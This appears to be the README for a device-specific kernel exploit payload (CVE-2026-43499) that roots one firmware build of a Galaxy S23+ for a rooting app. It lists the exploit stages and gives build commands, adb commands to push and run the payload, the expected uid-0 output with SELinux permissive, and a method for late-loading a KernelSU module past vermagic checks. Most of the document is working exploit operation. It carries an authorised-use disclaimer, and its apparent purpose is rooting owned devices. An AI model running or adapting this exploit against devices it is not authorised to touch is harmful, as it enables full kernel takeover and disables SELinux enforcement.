# Galaxy S23+ SM-S9160 (China) payload

Payload for `SM-S9160` running `S9160ZCS8FZI1`
(kernel `5.15.189-android13-8-3251900-abS9160ZCS8FZI1`, Android 16).

Device-tested on 2026-10-31 from `adb shell` (`uid=2000`, `u:r:shell:s0`):
tracefs KASLR, controlled mm/SKB reclaim, MCAST stale-waiter write
(`errno=99`, `sched_ok=1`), fake ashmem fops, configfs ARW, pipe physical
read/write and the workqueue UMH root daemon all completed, ending at uid 0
(`u:r:kernel:s0`).

The profile is firmware-bound. Do not use it on another S9160 build or on
S916B/S918B.

Registered in the support feed (`support/targets-v3.json`) and installed
end-to-end through Root My Galaxy in Shizuku mode on 2026-11-02 (attempt 2/24;
the first attempt hit the app's 120 s budget).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `a1a3c8445be54ecbf8db4ab63ddc5b20b41b9319686ede8318f95ad4fcb9fb73` |

The KernelSU step reuses the existing
`../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp`; no new module or loader is
published for this profile.

## KernelSU

On 2026-11-02 the app's KernelSU path was reproduced on this device. With
`../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` staged at both
`/data/local/tmp/ksud-s25u-kdp` and `/data/local/tmp/.ksud-stage`, running

```text
logcat late-load --package-name me.weishu.kernelsu
```

loaded the module embedded in that ksud, and `/proc/modules` then reported
`kernelsu 208896 0 - Live (OE)`.

The S916B release string in that module's `vermagic` is accepted because the
module has an empty `__versions` section: the kernel then compares only the
flags part after the first space
(`" SMP preempt mod_unload modversions aarch64"`), not the release token.

Notes: `ksud late-load` renames the staged `.ksud-stage` to `/data/adb/ksud`, so
both copies must exist (Root My Galaxy stages both); and this ksud's clap
rejects `--ephemeral`, so the helper must pass only
`late-load --package-name ...`. The app install was verified end-to-end in
Shizuku mode; standalone mode is not supported. See the port record.

## Build

```sh
make TARGET=dm2q-S9160ZCS8FZI1 ANDROID_NDK_HOME=/path/to/android-ndk
```

Outputs:

```text
build/dm2q-S9160ZCS8FZI1/cve-2026-43499
build/dm2q-S9160ZCS8FZI1/cve-2026-43499-app.so
build/dm2q-S9160ZCS8FZI1/cve-2026-43499-root
```

## ADB shell test

Push the app payload and the root helper, then run one attempt:

```sh
adb push cve-2026-43499-app.so /data/local/tmp/dm2q-s9160.so
adb push build/dm2q-S9160ZCS8FZI1/cve-2026-43499-root /data/local/tmp/rmg-s9160-root
adb shell chmod 755 /data/local/tmp/rmg-s9160-root

adb shell 'SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
  P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=900 \
  /data/local/tmp/rmg-s9160-root --run-payload /data/local/tmp/dm2q-s9160.so \
  /data/local/tmp/rmg-s9160-root /data/local/tmp/rmg-s9160.log'
```

Preparation can take 80-160 s.

Verify root:

```sh
adb shell '/data/local/tmp/rmg-s9160-root -c "id; whoami; getenforce"'
```

Expected:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root
Permissive
```

Only use on devices you own or are explicitly authorized to test.
